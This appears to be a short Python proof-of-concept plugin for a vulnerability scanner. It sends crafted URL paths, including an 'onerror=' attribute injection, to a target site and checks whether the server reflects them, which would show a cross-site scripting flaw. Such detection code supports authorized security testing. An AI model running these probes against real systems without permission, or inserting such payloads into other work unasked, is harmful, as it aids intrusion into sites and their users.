import requests
from plugin.util import randomString

def poc(u):
    domain = u.rstrip('/') + "/"

    payload = "(A({}))/".format(randomString(6))
    url = domain + payload

    headers = dict()
    headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    headers["Referer"] = url
    try:
        req = requests.get(url, headers=headers,timeout=35)
    except:
        return False
    if payload in req.text and req.status_code == 200:
        new_payload = "(A(\"onerror='{}'{}))/".format(randomString(6), randomString(6))
        url2 = domain + new_payload
        try:
            req2 = requests.get(url2, headers=headers)
        except:
            return False
        if new_payload in req2.text:
            return url2